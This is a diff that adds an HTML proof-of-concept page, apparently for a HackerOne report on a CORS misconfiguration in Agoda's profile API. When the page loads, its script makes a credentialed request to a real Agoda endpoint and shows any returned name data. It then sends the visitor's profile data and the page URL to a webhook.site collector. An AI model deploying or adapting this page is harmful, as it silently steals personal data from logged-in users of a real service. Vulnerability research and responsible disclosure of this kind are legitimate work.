@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agoda CORS Test (PoC)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        pre {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 6px;
+            overflow: auto;
+            max-height: 500px;
+            font-size: 12px;
+        }
+        .success { color: #4caf50; font-weight: bold; }
+        .error { color: #f44336; font-weight: bold; }
+        .info { color: #2196f3; }
+        .header {
+            background: #e8f5e9;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+        .header strong {
+            color: #2e7d32;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔍 Agoda CORS Misconfiguration Test</h1>
+            <p><strong>Identifier:</strong> hackerone-mz_ (sesuai aturan Agoda)</p>
+            <p><strong>Status:</strong> Menunggu pengambilan data...</p>
+        </div>
+
+        <div id="result">
+            <p>⏳ Mengambil data dari Agoda...</p>
+        </div>
+
+        <div style="margin-top: 20px; font-size: 12px; color: #888;">
+            <p>⚠️ Ini adalah Proof of Concept untuk testing keamanan. Tidak ada cookie atau data yang disimpan.</p>
+            <p>📌 Host: <span id="hostname"></span></p>
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        // PoC CORS Misconfiguration - Agoda Profile API
+        // Identifier: hackerone-mz_
+        // ================================================================
+
+        const WEBHOOK = 'https://webhook.site/e25f3018-8e6f-4ac7-abd2-7fddb4ea00fd';
+
+        // Tampilkan hostname halaman ini
+        document.getElementById('hostname').textContent = window.location.hostname;
+
+        // Ambil data dari Agoda
+        fetch('https://www.agoda.com/api/cronos/layout/PageHeaderApi/UserMenuViewModel', {
+            credentials: 'include',
+            headers: {
+                'User-Agent': 'hackerone-mz_'
+            }
+        })
+        .then(res => {
+            // Tampilkan status dan header CORS
+            const origin = res.headers.get('access-control-allow-origin');
+            const creds = res.headers.get('access-control-allow-credentials');
+            const resultDiv = document.getElementById('result');
+
+            let html = `
+                <div style="background:#e3f2fd;padding:10px;border-radius:4px;margin:10px 0;">
+                    <p><strong>Status:</strong> ${res.status} ${res.statusText}</p>
+                    <p><strong>Access-Control-Allow-Origin:</strong> ${origin || '(tidak ada)'}</p>
+                    <p><strong>Access-Control-Allow-Credentials:</strong> ${creds || '(tidak ada)'}</p>
+                </div>
+            `;
+
+            if (origin === 'null' || origin === '*') {
+                html += `<p class="success">✅ Server menerima origin null/wildcard (CORS longgar!)</p>`;
+            } else if (origin) {
+                html += `<p class="info">ℹ️ Server mengembalikan origin: ${origin}</p>`;
+            } else {
+                html += `<p class="error">❌ Tidak ada header CORS (kemungkinan tidak ada CORS)</p>`;
+            }
+
+            if (creds === 'true') {
+                html += `<p class="success">✅ Credentials diizinkan (cookie akan dikirim!)</p>`;
+            }
+
+            resultDiv.innerHTML = html;
+            return res.json();
+        })
+        .then(data => {
+            const resultDiv = document.getElementById('result');
+            const hasData = data && Object.keys(data).length > 0;
+
+            // Tampilkan data
+            let html = resultDiv.innerHTML;
+            html += `
+                <hr>
+                <p><strong>📦 Data yang diterima:</strong></p>
+                <pre>${JSON.stringify(data, null, 2)}</pre>
+            `;
+
+            if (hasData && data.firstName) {
+                html += `<p class="success">✅ DATA SENSITIF DITERIMA: ${data.firstName} ${data.lastName || ''}</p>`;
+            } else if (hasData) {
+                html += `<p class="info">ℹ️ Data diterima (${Object.keys(data).length} field), tapi tidak ada nama.</p>`;
+            } else {
+                html += `<p class="error">❌ Data kosong (mungkin perlu login atau endpoint tidak aktif)</p>`;
+            }
+
+            resultDiv.innerHTML = html;
+
+            // Kirim ke webhook (hanya data API, TANPA cookie)
+            fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    identifier: 'hackerone-mz_',
+                    timestamp: new Date().toISOString(),
+                    origin: window.location.hostname,
+                    url: window.location.href,
+                    userData: data,
+                    corsHeaders: {
+                        origin: document.querySelector('pre')?.textContent || 'n/a'
+                    }
+                })
+            });
+
+            // Tampilkan pesan di console
+            console.log('=== DATA DARI AGODA ===');
+            console.log(data);
+            console.log('Data dikirim ke webhook.');
+
+        })
+        .catch(err => {
+            // Jika error CORS, tampilkan pesan
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `
+                <div style="background:#ffebee;padding:10px;border-radius:4px;border:1px solid #f44336;">
+                    <p class="error">❌ GAGAL mengambil data dari Agoda!</p>
+                    <p><strong>Error:</strong> ${err.message}</p>
+                    <p style="font-size:14px;color:#555;">
+                        ${err.message.includes('Failed to fetch') || err.message.includes('CORS') 
+                            ? '🔴 Ini berarti CORS policy memblokir request dari origin ini. Server Agoda TIDAK mengizinkan akses cross-origin.' 
+                            : 'Cek koneksi internet atau coba refresh.'}
+                    </p>
+                </div>
+            `;
+            console.error('Error:', err);
+        });
+    </script>
+</body>
+</html>
+
